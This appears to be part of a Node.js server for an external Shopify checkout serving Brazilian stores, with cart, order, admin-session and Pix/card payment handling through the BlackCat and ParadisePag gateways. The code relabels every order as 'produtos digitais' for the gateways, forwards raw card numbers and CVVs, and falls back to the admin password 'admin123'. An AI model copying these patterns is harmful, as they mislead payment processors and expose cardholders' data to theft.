const http = require("http");
const fs = require("fs");
const path = require("path");
const dns = require("dns").promises;
const crypto = require("crypto");

const root = __dirname;

function loadDotEnv(filePath) {
  if (!fs.existsSync(filePath)) return;
  for (const line of fs.readFileSync(filePath, "utf8").split(/\r?\n/)) {
    const match = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*?)\s*$/);
    if (!match || Object.prototype.hasOwnProperty.call(process.env, match[1])) continue;
    let value = match[2];
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }
    process.env[match[1]] = value;
  }
}

loadDotEnv(path.join(root, ".env"));

const secretEnvFields = {
  shopifyAccessToken: "SHOPIFY_ACCESS_TOKEN",
  shopifyClientSecret: "SHOPIFY_CLIENT_SECRET",
  blackcatApiKey: "BLACKCAT_API_KEY",
  paradiseApiKey: "PARADISE_API_KEY",
  highnoteSkLiveKey: "HIGHNOTE_SK_LIVE_KEY",
  highnoteApiKey: "HIGHNOTE_SK_LIVE_KEY",
  stripeApiKey: "STRIPE_API_KEY"
};

const dataPath = process.env.CHECKOUT_DATA_FILE || path.join(root, "data", "db.json");
const port = Number(process.env.PORT || 5174);
const publicCheckoutTarget = process.env.CHECKOUT_DNS_TARGET || "checkout.wpcheckout.com";
const shopifyApiVersion = "2026-07";
const gatewayProductName = "produtos digitais";
const demoPixPayload = "00020126580014br.gov.bcb.pix0136wpink-pagamento-demo520400005303986540552.045802BR5920SLV SUPLEMENTOS LTDA6009SAO PAULO62070503***6304ABCD";
const blackcatApiBaseUrl = process.env.BLACKCAT_API_BASE_URL || "https://api.blackcatpay.com.br/api";
const paradiseApiBaseUrl = process.env.PARADISE_API_BASE_URL || "https://multi.paradisepags.com";
const adminUser = process.env.ADMIN_USER || "admin";
const adminPassword = process.env.ADMIN_PASSWORD || "admin123";
const adminSessions = new Map();
const sessionCookieName = "wpink_admin_session";

const mimeTypes = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".avif": "image/avif",
  ".svg": "image/svg+xml",
  ".woff2": "font/woff2",
  ".mp4": "video/mp4",
  ".txt": "text/plain; charset=utf-8"
};

function readDb() {
  const db = JSON.parse(fs.readFileSync(dataPath, "utf8"));
  for (const store of db.stores || []) {
    for (const [field, envName] of Object.entries(secretEnvFields)) {
      store[field] = process.env[envName] || "";
    }
  }
  return db;
}

function writeDb(db) {
  const safeDb = JSON.parse(JSON.stringify(db));
  for (const store of safeDb.stores || []) {
    for (const field of Object.keys(secretEnvFields)) store[field] = "";
  }
  fs.writeFileSync(dataPath, `${JSON.stringify(safeDb, null, 2)}\n`);
}

function sendJson(res, status, data) {
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET,POST,PATCH,DELETE,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type,Accept"
  });
  res.end(JSON.stringify(data));
}

function sendError(res, status, message) {
  sendJson(res, status, { error: message });
}

function sendOptions(res) {
  res.writeHead(204, {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET,POST,PATCH,DELETE,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type,Accept",
    "Access-Control-Max-Age": "86400"
  });
  res.end();
}

function parseCookies(header = "") {
  return String(header || "").split(";").reduce((cookies, item) => {
    const [rawName, ...rawValue] = item.trim().split("=");
    if (!rawName) return cookies;
    cookies[rawName] = decodeURIComponent(rawValue.join("=") || "");
    return cookies;
  }, {});
}

function adminSessionFromRequest(req) {
  const token = parseCookies(req.headers.cookie)[sessionCookieName];
  if (!token) return null;
  const session = adminSessions.get(token);
  if (!session) return null;
  if (session.expiresAt < Date.now()) {
    adminSessions.delete(token);
    return null;
  }
  session.expiresAt = Date.now() + 1000 * 60 * 60 * 12;
  return session;
}

function setAdminSessionCookie(res, token) {
  res.setHeader("Set-Cookie", `${sessionCookieName}=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=43200`);
}

function clearAdminSessionCookie(res) {
  res.setHeader("Set-Cookie", `${sessionCookieName}=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
}

function isPublicApi(req, pathname) {
  if (pathname === "/api/admin/session" || pathname === "/api/admin/login" || pathname === "/api/admin/logout") return true;
  if (req.method === "GET" && pathname === "/api/checkout-config") return true;
  if (req.method === "POST" && pathname === "/api/cart-session") return true;
  if (req.method === "POST" && pathname === "/api/luna-cart") return true;
  if (req.method === "GET" && /^\/api\/cart-session\/[^/]+$/.test(pathname)) return true;
  if (req.method === "POST" && pathname === "/api/payments/create") return true;
  if (req.method === "POST" && (pathname === "/api/webhooks/blackcat" || pathname === "/api/webhooks/paradise")) return true;
  if (req.method === "GET" && /^\/api\/orders\/[^/]+\/status$/.test(pathname)) return true;
  if (req.method === "POST" && pathname === "/api/collect") return true;
  if (req.method === "DELETE" && pathname.startsWith("/api/collect/")) return true;
  return false;
}

function requireAdmin(req, res, pathname) {
  if (isPublicApi(req, pathname)) return true;
  if (adminSessionFromRequest(req)) return true;
  sendError(res, 401, "Login obrigatório.");
  return false;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 2_000_000) {
        req.destroy();
        reject(new Error("Payload muito grande."));
      }
    });
    req.on("end", () => {
      if (!body) return resolve({});
      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(new Error("JSON inválido."));
      }
    });
  });
}

function slugify(value) {
  return String(value || "")
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "");
}

function id(prefix) {
  return `${prefix}_${crypto.randomBytes(6).toString("hex")}`;
}

function now() {
  return new Date().toISOString();
}

function saoPauloDateKey(value = new Date()) {
  return new Intl.DateTimeFormat("en-CA", {
    timeZone: "America/Sao_Paulo",
    year: "numeric",
    month: "2-digit",
    day: "2-digit"
  }).format(new Date(value));
}

function cleanDomain(value) {
  return String(value || "").trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "").toLowerCase();
}

function normalizeShopifyDomain(value) {
  const domain = cleanDomain(value);
  if (!domain) return "";
  return domain.includes(".") ? domain : `${domain}.myshopify.com`;
}

function numberValue(value) {
  const raw = String(value ?? "").trim();
  if (!raw) return 0;
  const cleaned = raw.replace(/[^\d,.-]/g, "");
  const decimal = cleaned.includes(",") && !cleaned.includes(".") ? cleaned.replace(",", ".") : cleaned.replace(/,/g, "");
  return Number(decimal) || 0;
}

function legacyId(value) {
  return String(value || "").split("/").filter(Boolean).pop() || "";
}

function tokenLooksLikeClientSecret(value) {
  return String(value || "").trim().startsWith("shpss_");
}

function findStore(db, query, hostHeader = "") {
  const host = cleanDomain(query.get("host") || hostHeader.split(":")[0]);
  const key = query.get("store") || query.get("storeId") || "";
  if (key) {
    const normalizedKey = slugify(key);
    return db.stores.find((store) => store.id === key || store.slug === normalizedKey || store.slug === key);
  }
  if (!host || host === "localhost" || host === "127.0.0.1") return db.stores[0];
  return db.stores.find((store) => {
    return [store.checkoutDomain, store.shopifyDomain].map(cleanDomain).includes(host);
  }) || db.stores[0];
}

function findProduct(db, store, query) {
  if (!store) return null;
  const productKey = query.get("product") || query.get("productId") || "";
  const variant = query.get("variant") || "";
  const storeProducts = db.products
    .filter((product) => product.storeId === store.id && product.active !== false)
    .sort((a, b) => {
      const aPriority = a.source === "shopify" ? 0 : a.variantId ? 1 : 2;
      const bPriority = b.source === "shopify" ? 0 : b.variantId ? 1 : 2;
      return aPriority - bPriority;
    });
  if (productKey) {
    const normalizedKey = slugify(productKey);
    const match = storeProducts.find((product) => product.id === productKey || product.slug === normalizedKey || product.slug === productKey);
    if (match) return match;
  }
  if (variant) {
    const match = storeProducts.find((product) => String(product.variantId || "") === String(variant));
    if (match) return match;
  }
  return storeProducts[0] || null;
}

function centsToValue(value) {
  const cents = Number(value || 0);
  if (!Number.isFinite(cents)) return 0;
  return Math.round(((cents / 100) + Number.EPSILON) * 100) / 100;
}

function cartItemCatalogProduct(db, store, item = {}) {
  if (!store) return null;
  const variantId = String(item.variant_id || item.variantId || item.id || "");
  const productId = String(item.productId || "");
  return db.products.find((product) => {
    if (product.storeId !== store.id || product.active === false) return false;
    return product.id === productId || String(product.variantId || "") === variantId;
  }) || null;
}

function normalizeCartSessionItem(db, store, item = {}) {
  const catalogProduct = cartItemCatalogProduct(db, store, item) || {};
  const quantity = Math.max(1, Number(item.quantity || 1));
  const unitPrice = centsToValue(item.final_price || item.price || 0) || Number(catalogProduct.price || 0);
  const compareAt = centsToValue(item.original_price || item.compare_at_price || 0) || Number(catalogProduct.compareAt || 0);
  const variantId = String(item.variant_id || item.variantId || catalogProduct.variantId || "");
  const name = catalogProduct.name || item.product_title || item.title || item.name || "Produto";
  return {
    productId: catalogProduct.id || "",
    name,
    title: name,
    variantTitle: catalogProduct.variantTitle || item.variant_title || "",
    sku: catalogProduct.sku || item.sku || "",
    price: unitPrice,
    compareAt: compareAt > unitPrice ? compareAt : Number(catalogProduct.compareAt || 0),
    image: catalogProduct.image || item.image || "./assets/product.png",
    variantId,
    shopifyProductId: String(item.product_id || catalogProduct.shopifyProductId || ""),
    shopifyVariantGid: catalogProduct.shopifyVariantGid || "",
    key: String(item.key || variantId || ""),
    url: item.url || "",
    quantity
  };
}

function pruneCartSessions(db) {
  const cutoff = Date.now();
  db.cartSessions = (db.cartSessions || [])
    .filter((session) => new Date(session.expiresAt || 0).getTime() > cutoff)
    .slice(-200);
}

function createCartSession(db, store, cartPayload = {}, meta = {}) {
  pruneCartSessions(db);
  const timestamp = now();
  const items = (Array.isArray(cartPayload.items) ? cartPayload.items : [])
    .map((item) => normalizeCartSessionItem(db, store, item))
    .filter((item) => item.variantId || item.productId || item.name);
  const subtotal = items.reduce((sum, item) => sum + Number(item.price || 0) * Number(item.quantity || 1), 0);
  const session = {
    id: id("cart"),
    storeId: store?.id || "",
    storeSlug: store?.slug || "",
    source: "shopify-cart",
    items,
    totals: {
      subtotal: Math.round((subtotal + Number.EPSILON) * 100) / 100,
      shopifySubtotal: centsToValue(cartPayload.items_subtotal_price),
      shopifyTotal: centsToValue(cartPayload.total_price)
    },
    cartToken: String(cartPayload.token || ""),
    shop: String(meta.shop || ""),
    origin: String(meta.origin || ""),
    url: String(meta.url || ""),
    createdAt: timestamp,
    expiresAt: new Date(Date.now() + 1000 * 60 * 60 * 24).toISOString()
  };
  db.cartSessions.push(session);
  return session;
}

function publicCartSession(db, sessionId) {
  if (!sessionId) return null;
  pruneCartSessions(db);
  const session = db.cartSessions.find((item) => item.id === sessionId);
  if (!session) return null;
  return {
    id: session.id,
    storeId: session.storeId,
    storeSlug: session.storeSlug,
    items: session.items,
    totals: session.totals,
    source: session.source,
    createdAt: session.createdAt
  };
}

function summary(db) {
  const paidOrders = db.orders.filter((order) => order.status === "paid");
  const pendingOrders = db.orders.filter((order) => order.status === "pending");
  const todayKey = saoPauloDateKey();
  const todayOrders = db.orders.filter((order) => order.createdAt && saoPauloDateKey(order.createdAt) === todayKey);
  const paidTotal = paidOrders.reduce((sum, order) => sum + Number(order.totals?.total || 0), 0);
  const pendingTotal = pendingOrders.reduce((sum, order) => sum + Number(order.totals?.total || 0), 0);
  const todayTotal = todayOrders.reduce((sum, order) => sum + Number(order.totals?.total || 0), 0);

  return {
    stores: db.stores.length,
    products: db.products.length,
    orders: db.orders.length,
    paidOrders: paidOrders.length,
    pendingOrders: pendingOrders.length,
    cancelledOrders: db.orders.filter((order) => order.status === "cancelled").length,
    todayOrders: todayOrders.length,
    paidTotal,
    pendingTotal,
    todayTotal,
    averagePaidTicket: paidOrders.length ? paidTotal / paidOrders.length : 0
  };
}

function publicStore(store) {
  const activeGateway = store.activeGateway || "manual";
  return {
    id: store.id,
    name: store.name,
    slug: store.slug,
    shopifyDomain: store.shopifyDomain,
    checkoutDomain: store.checkoutDomain,
    dnsTarget: store.dnsTarget || publicCheckoutTarget,
    redirectMode: store.redirectMode || "checkout",
    status: store.status || "draft",
    activeGateway,
    paymentMethods: activeGateway === "paradise" ? ["pix"] : ["pix", "card"],
    shippingOptions: normalizeShippingOptions(store.shippingOptions)
  };
}

function adminStore(store) {
  return {
    ...publicStore(store),
    shopifyClientId: store.shopifyClientId || "",
    createdAt: store.createdAt,
    updatedAt: store.updatedAt,
    lastShopifySyncAt: store.lastShopifySyncAt || "",
    shopifyScopes: store.shopifyScopes || [],
    lastShopifyScopeCheckAt: store.lastShopifyScopeCheckAt || "",
    hasShopifyToken: Boolean(store.shopifyAccessToken && !tokenLooksLikeClientSecret(store.shopifyAccessToken)),
    hasShopifyClientSecret: Boolean(store.shopifyClientSecret || tokenLooksLikeClientSecret(store.shopifyAccessToken)),
    hasBlackcatApiKey: Boolean(store.blackcatApiKey),
    hasParadiseApiKey: Boolean(store.paradiseApiKey),
    themeIntegration: store.themeIntegration || null
  };
}

function storeTokenFromBody(body, existing) {
  const token = String(body.shopifyAccessToken || "").trim();
  if (!token || /^[-*•]+$/.test(token) || tokenLooksLikeClientSecret(token)) {
    const existingToken = existing?.shopifyAccessToken || "";
    return tokenLooksLikeClientSecret(existingToken) ? "" : existingToken;
  }
  return token;
}

function storeSecretFromBody(body, existing) {
  const directSecret = String(body.shopifyClientSecret || "").trim();
  const tokenField = String(body.shopifyAccessToken || "").trim();
  if (directSecret && !/^[-*•]+$/.test(directSecret)) return directSecret;
  if (tokenLooksLikeClientSecret(tokenField)) return tokenField;
  if (existing?.shopifyClientSecret) return existing.shopifyClientSecret;
  return tokenLooksLikeClientSecret(existing?.shopifyAccessToken) ? existing.shopifyAccessToken : "";
}

function secretFromBody(value, existingValue = "") {
  const secret = String(value || "").trim();
  if (!secret || /^[-*•]+$/.test(secret)) return existingValue || "";
  return secret;
}

function defaultShippingOptions() {
  return [
    { name: "Sedex", days: "Em até 17 dias úteis", price: 47.31 },
    { name: "Total Express", days: "Em até 19 dias úteis", price: 12.14 },
    { name: "J&T", days: "Em até 20 dias úteis", price: 12.21 },
    { name: "PAC", days: "Em até 21 dias úteis", price: 25.73 }
  ];
}

function normalizeShippingOptions(options) {
  const source = Array.isArray(options) && options.length ? options : defaultShippingOptions();
  const normalized = source.map((option) => ({
    name: String(option.name || "").trim(),
    days: String(option.days || "").trim(),
    price: Number(option.price || 0)
  })).filter((option) => option.name && option.days && option.price >= 0);
  return normalized.length ? normalized : defaultShippingOptions();
}

function digitsOnly(value) {
  return String(value || "").replace(/\D/g, "");
}

function amountInCents(value) {
  return Math.max(0, Math.round(Number(value || 0) * 100));
}

function fullCustomerName(order) {
  return [order.customer?.firstName, order.customer?.lastName].filter(Boolean).join(" ").trim() || "Cliente";
}

function cleanTracking(tracking = {}) {
  const allowed = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "src", "sck"];
  return allowed.reduce((result, key) => {
    const value = String(tracking[key] || "").trim();
    if (value) result[key] = value;
    return result;
  }, {});
}

function absoluteApiUrl(req, pathname) {
  const proto = String(req.headers["x-forwarded-proto"] || "").split(",")[0] || "http";
  const host = String(req.headers["x-forwarded-host"] || req.headers.host || `localhost:${port}`).split(",")[0];
  return `${proto}://${host}${pathname}`;
}

function orderStatusFromGateway(provider, statusValue, eventValue = "") {
  const status = String(statusValue || eventValue || "").toLowerCase();
  const event = String(eventValue || "").toLowerCase();
  if (["paid", "approved", "completed", "success"].includes(status) || event.includes(".paid")) return "paid";
  if (["cancelled", "canceled", "failed", "refused", "refunded", "chargeback", "expired"].includes(status) || event.includes(".failed")) return "cancelled";
  if (provider === "blackcat" && status === "pending_3ds") return "pending";
  return "pending";
}

function gatewayLabel(provider) {
  return {
    blackcat: "BlackCat",
    paradise: "ParadisePag",
    manual: "Manual"
  }[provider] || provider || "Manual";
}

function publicGatewayPayment(payment = {}) {
  return {
    provider: payment.provider || "manual",
    status: payment.status || "pending",
    orderStatus: payment.orderStatus || "pending",
    transactionId: payment.transactionId || "",
    reference: payment.reference || "",
    invoiceUrl: payment.invoiceUrl || "",
    redirectUrl: payment.redirectUrl || "",
    pixPayload: payment.pixPayload || "",
    qrCodeBase64: payment.qrCodeBase64 || "",
    expiresAt: payment.expiresAt || "",
    message: payment.message || ""
  };
}

function publicOrderStatus(order = {}) {
  return {
    id: order.id || "",
    status: order.status || "pending",
    updatedAt: order.updatedAt || "",
    payment: {
      provider: order.gateway?.provider || "manual",
      status: order.gateway?.status || order.status || "pending",
      orderStatus: order.status || "pending",
      transactionId: order.gateway?.transactionId || "",
      reference: order.gateway?.reference || order.id || ""
    },
    shopify: {
      created: Boolean(order.shopifyOrder?.id),
      name: order.shopifyOrder?.name || "",
      syncStatus: order.shopifySync?.status || "",
      syncMessage: order.shopifySync?.message || ""
    }
  };
}

function sanitizeOrderForStorage(order) {
  const safeOrder = JSON.parse(JSON.stringify(order || {}));
  if (safeOrder.payment?.card) {
    const number = digitsOnly(safeOrder.payment.card.number);
    safeOrder.payment.card = {
      brand: safeOrder.cardBrand || safeOrder.payment.card.brand || "",
      last4: number ? number.slice(-4) : safeOrder.payment.card.last4 || "",
      installments: Number(safeOrder.payment.card.installments || safeOrder.installments || 1)
    };
  }
  if (safeOrder.payment?.device) delete safeOrder.payment.device;
  return safeOrder;
}

function prepareOrder(body) {
  const timestamp = now();
  const order = {
    ...body,
    id: body.id || id("order"),
    status: body.status || "pending",
    storeId: body.storeId || body.panel?.storeId || "",
    productId: body.productId || body.panel?.productId || "",
    createdAt: body.createdAt || timestamp,
    updatedAt: timestamp
  };
  order.items = Array.isArray(order.items)
    ? order.items.map((item) => ({
      productId: item.productId || "",
      name: item.name || item.title || "Produto",
      title: item.title || item.name || "Produto",
      variantTitle: item.variantTitle || "",
      sku: item.sku || "",
      price: Number(item.price || 0),
      compareAt: Number(item.compareAt || 0),
      image: item.image || "",
      variantId: String(item.variantId || ""),
      shopifyVariantGid: item.shopifyVariantGid || "",
      quantity: Math.max(1, Number(item.quantity || 1))
    })).filter((item) => item.name && item.quantity > 0)
    : [];
  order.product = {
    ...(order.product || {}),
    name: gatewayProductName,
    title: gatewayProductName,
    description: gatewayProductName
  };
  order.paymentMethod = order.paymentMethod || order.payment?.method || "pix";
  return order;
}

async function gatewayFetchJson(url, apiKey, payload) {
  let response;
  try {
    response = await fetch(url, {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-API-Key": apiKey
      },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    const host = new URL(url).hostname;
    if (error.cause?.code === "ENOTFOUND") {
      throw new Error(`Não foi possível conectar na gateway: o domínio ${host} não está resolvendo DNS agora.`);
    }
    throw new Error(`Não foi possível conectar na gateway: ${error.message || "falha de rede"}.`);
  }
  const text = await response.text();
  let json = {};
  try {
    json = text ? JSON.parse(text) : {};
  } catch (error) {
    json = { message: text };
  }
  if (!response.ok || json.success === false || json.status === "error") {
    throw new Error(json.message || json.error || `Gateway respondeu ${response.status}.`);
  }
  return json;
}

async function gatewayGetJson(url, apiKey) {
  let response;
  try {
    response = await fetch(url, {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-API-Key": apiKey
      }
    });
  } catch (error) {
    const host = new URL(url).hostname;
    if (error.cause?.code === "ENOTFOUND") {
      throw new Error(`Não foi possível conectar na gateway: o domínio ${host} não está resolvendo DNS agora.`);
    }
    throw new Error(`Não foi possível conectar na gateway: ${error.message || "falha de rede"}.`);
  }
  const text = await response.text();
  let json = {};
  try {
    json = text ? JSON.parse(text) : {};
  } catch (error) {
    json = { message: text };
  }
  if (!response.ok || json.success === false || json.status === "error") {
    throw new Error(json.message || json.error || `Gateway respondeu ${response.status}.`);
  }
  return json;
}

function gatewayCustomer(order) {
  return {
    name: fullCustomerName(order),
    email: order.customer?.email || "",
    phone: digitsOnly(order.customer?.phone),
    document: digitsOnly(order.customer?.cpf)
  };
}

function blackcatPayload(order, req) {
  const amount = amountInCents(order.totals?.total);
  const customer = gatewayCustomer(order);
  const tracking = cleanTracking(order.tracking);
  const payload = {
    amount,
    currency: "BRL",
    paymentMethod: order.paymentMethod === "card" ? "credit_card" : "pix",
    items: [{
      title: gatewayProductName,
      unitPrice: amount,
      quantity: 1,
      tangible: false
    }],
    customer: {
      name: customer.name,
      email: customer.email,
      phone: customer.phone,
      document: {
        type: "cpf",
        number: customer.document
      }
    },
    postbackUrl: absoluteApiUrl(req, "/api/webhooks/blackcat"),
    externalRef: order.id,
    metadata: JSON.stringify({ orderId: order.id, storeId: order.storeId, checkout: "wpink" }),
    ...tracking
  };

  if (order.paymentMethod === "card") {
    const card = order.payment?.card || {};
    payload.card = {
      number: digitsOnly(card.number),
      holderName: String(card.holderName || "").trim(),
      expiryMonth: String(card.expiryMonth || "").padStart(2, "0"),
      expiryYear: String(card.expiryYear || ""),
      cvv: digitsOnly(card.cvv),
      installments: Number(card.installments || 1)
    };
    if (order.payment?.device) payload.device = order.payment.device;
  } else {
    payload.pix = { expiresInDays: 1 };
  }

  return payload;
}

function normalizeBlackcatPayment(json) {
  const data = json.data || json;
  const paymentData = data.paymentData || data.pix || {};
  const status = String(data.status || "PENDING");
  return {
    provider: "blackcat",
    status,
    orderStatus: orderStatusFromGateway("blackcat", status),
    transactionId: String(data.transactionId || data.id || ""),
    reference: String(data.externalRef || data.externalReference || ""),
    invoiceUrl: data.invoiceUrl || "",
    redirectUrl: data.threeDS?.start?.acsUrl || "",
    pixPayload: paymentData.copyPaste || paymentData.qrCode || paymentData.qrcode || "",
    qrCodeBase64: paymentData.qrCodeBase64 || paymentData.qr_code_base64 || "",
    expiresAt: paymentData.expiresAt || data.expiresAt || "",
    message: data.refusedReason?.description || "",
    rawStatus: status,
    raw: json
  };
}

async function createBlackcatPayment(store, order, req) {
  if (!store.blackcatApiKey) throw new Error("Configure a chave da BlackCat no painel.");
  const json = await gatewayFetchJson(`${blackcatApiBaseUrl.replace(/\/$/, "")}/sales/create-sale`, store.blackcatApiKey, blackcatPayload(order, req));
  return normalizeBlackcatPayment(json);
}

function paradisePayload(order, req) {
  const customer = gatewayCustomer(order);
  return {
    amount: amountInCents(order.totals?.total),
    description: gatewayProductName,
    reference: order.id,
    postback_url: absoluteApiUrl(req, "/api/webhooks/paradise"),
    source: "api_externa",
    customer: {
      name: customer.name,
      email: customer.email,
      phone: customer.phone,
      document: customer.document
    },
    tracking: cleanTracking(order.tracking)
  };
}

function normalizeParadisePayment(json, order) {
  const paymentStatus = json.payment_status || "pending";
  return {
    provider: "paradise",
    status: paymentStatus,
    orderStatus: orderStatusFromGateway("paradise", paymentStatus),
    transactionId: String(json.transaction_id || ""),
    reference: String(json.id || order.id),
    pixPayload: json.qr_code || json.pix_code || "",
    qrCodeBase64: json.qr_code_base64 || "",
    expiresAt: json.expires_at || "",
    rawStatus: json.status || paymentStatus,
    raw: json
  };
}

async function createParadisePayment(store, order, req) {
  if (order.paymentMethod !== "pix") throw new Error("ParadisePag aceita apenas Pix neste checkout.");
  if (!store.paradiseApiKey) throw new Error("Configure a chave da ParadisePag no painel.");
  const json = await gatewayFetchJson(`${paradiseApiBaseUrl.replace(/\/$/, "")}/api/v1/transaction.php`, store.paradiseApiKey, paradisePayload(order, req));
  if (json.status && json.status !== "success") throw new Error(json.message || "ParadisePag recusou a transação.");
  return normalizeParadisePayment(json, order);
}

async function createGatewayPayment(store, order, req) {
  const provider = store.activeGateway || "manual";
  if (provider === "blackcat") return createBlackcatPayment(store, order, req);
  if (provider === "paradise") return createParadisePayment(store, order, req);
  return {
    provider: "manual",
    status: "pending",
    orderStatus: "pending",
    transactionId: "",
    reference: order.id,
    pixPayload: order.paymentMethod === "pix" ? demoPixPayload : "",
    qrCodeBase64: "",
    expiresAt: "",
    rawStatus: "manual"
  };
}

function metadataOrderId(value) {
  if (!value) return "";
  if (typeof value === "object") return value.orderId || value.order_id || "";
  try {
    const data = JSON.parse(String(value));
    return data.orderId || data.order_id || "";
  } catch (error) {
    return "";
  }
}

function findOrderForWebhook(db, body) {
  const orderRefs = [
    body.externalReference,
    body.externalRef,
    body.external_id,
    body.reference,
    body.id,
    metadataOrderId(body.metadata)
  ].filter(Boolean).map(String);
  const transactionRefs = [
    body.transactionId,
    body.transaction_id,
    body.id
  ].filter(Boolean).map(String);

  return db.orders.find((order) => orderRefs.includes(String(order.id)))
    || db.orders.find((order) => transactionRefs.includes(String(order.gateway?.transactionId || "")))
    || null;
}

function applyGatewayWebhook(db, provider, body) {
  const order = findOrderForWebhook(db, body);
  if (!order) return null;
  const status = body.status || body.raw_status || body.event || "";
  const event = body.event || "";
  order.status = orderStatusFromGateway(provider, status, event);
  order.updatedAt = now();
  order.gateway = {
    ...(order.gateway || {}),
    provider,
    status,
    event,
    transactionId: String(body.transactionId || body.transaction_id || order.gateway?.transactionId || ""),
    reference: String(body.externalReference || body.external_id || order.id),
    lastWebhookAt: now(),
    webhookPayload: body
  };
  return order;
}

function shopifyAccessTokenIsFresh(store) {
  if (!store.shopifyAccessToken || tokenLooksLikeClientSecret(store.shopifyAccessToken)) return false;
  if (!store.shopifyAccessTokenExpiresAt) return true;
  return new Date(store.shopifyAccessTokenExpiresAt).getTime() > Date.now() + 60_000;
}

async function requestShopifyAccessToken(store) {
  const domain = normalizeShopifyDomain(store.shopifyDomain);
  const clientId = String(store.shopifyClientId || "").trim();
  const clientSecret = String(store.shopifyClientSecret || "").trim();
  if (!domain) throw new Error("Informe o domínio .myshopify.com da loja.");
  if (!clientId || !clientSecret) {
    throw new Error("Esse app do Dev Dashboard precisa de Client ID e Client secret. Cole o Client ID e deixe o segredo shpss_ no campo Client secret.");
  }

  const body = new URLSearchParams({
    grant_type: "client_credentials",
    client_id: clientId,
    client_secret: clientSecret
  });
  const response = await fetch(`https://${domain}/admin/oauth/access_token`, {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: body.toString()
  });
  const json = await response.json().catch(() => ({}));
  if (!response.ok) {
    throw new Error(json.error_description || json.error || `Shopify recusou Client ID/secret (${response.status}).`);
  }

  store.shopifyAccessToken = json.access_token || "";
  store.shopifyAccessTokenExpiresAt = json.expires_in ? new Date(Date.now() + (Number(json.expires_in) - 300) * 1000).toISOString() : "";
  store.shopifyScopes = String(json.scope || "").split(",").map((scope) => scope.trim()).filter(Boolean).sort();
  return store.shopifyAccessToken;
}

async function getShopifyAccessToken(store) {
  if (shopifyAccessTokenIsFresh(store)) return store.shopifyAccessToken;
  if (tokenLooksLikeClientSecret(store.shopifyAccessToken) && !store.shopifyClientSecret) {
    store.shopifyClientSecret = store.shopifyAccessToken;
    store.shopifyAccessToken = "";
  }
  return requestShopifyAccessToken(store);
}

function shopifyErrorMessage(json, fallback) {
  const rawMessage = Array.isArray(json.errors)
    ? json.errors.map((error) => error.message).filter(Boolean).join(" ")
    : json.errors?.[0]?.message || json.errors || fallback;
  const message = String(rawMessage || fallback || "Erro Shopify.");
  if (/shop is under review|access denied for .* field/i.test(message)) {
    return `${message} A Shopify esta bloqueando essa API enquanto a loja esta em analise. Use CSV para produtos e upload manual do tema ate a revisao terminar.`;
  }
  return message;
}

async function shopifyGraphql(store, query, variables = {}) {
  const domain = normalizeShopifyDomain(store.shopifyDomain);
  if (!domain) throw new Error("Informe o domínio .myshopify.com da loja.");
  let token = await getShopifyAccessToken(store);

  let response = await fetch(`https://${domain}/admin/api/${shopifyApiVersion}/graphql.json`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Shopify-Access-Token": token
    },
    body: JSON.stringify({ query, variables })
  });
  if (response.status === 401 && store.shopifyClientId && store.shopifyClientSecret) {
    store.shopifyAccessToken = "";
    store.shopifyAccessTokenExpiresAt = "";
    token = await requestShopifyAccessToken(store);
    response = await fetch(`https://${domain}/admin/api/${shopifyApiVersion}/graphql.json`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Shopify-Access-Token": token
      },
      body: JSON.stringify({ query, variables })
    });
  }
  const json = await response.json().catch(() => ({}));
  if (!response.ok) {
    throw new Error(shopifyErrorMessage(json, `Shopify respondeu ${response.status}.`));
  }
  if (json.errors?.length) {
    throw new Error(shopifyErrorMessage(json, "Erro Shopify."));
  }
  return json.data;
}

const shopifyProductsQuery = `
  query CheckoutProducts($cursor: String) {
    products(first: 50, after: $cursor, query: "status:active") {
      nodes {
        id
        legacyResourceId
        title
        handle
        status
        featuredMedia {
          preview {
            image {
              url
            }
          }
        }
        variants(first: 100) {
          nodes {
            id
            legacyResourceId
            title
            sku
            price
            compareAtPrice
            availableForSale
            media(first: 1) {
              nodes {
                preview {
                  image {
                    url
                  }
                }
              }
            }
          }
        }
      }
      pageInfo {
        hasNextPage
        endCursor
      }
    }
  }
`;

const shopifyScopesQuery = `
  query CheckoutGrantedScopes {
    appInstallation {
      accessScopes {
        handle
      }
    }
  }
`;

const shopifyOrderCreateMutation = `
  mutation ExternalCheckoutOrderCreate($order: OrderCreateOrderInput!, $options: OrderCreateOptionsInput) {
    orderCreate(order: $order, options: $options) {
      userErrors {
        field
        message
      }
      order {
        id
        legacyResourceId
        name
        displayFinancialStatus
        totalPriceSet {
          shopMoney {
            amount
            currencyCode
          }
        }
      }
    }
  }
`;

const shopifyMainThemeQuery = `
  query CheckoutMainTheme {
    themes(first: 1, roles: [MAIN]) {
      nodes {
        id
        name
        role
      }
    }
  }
`;

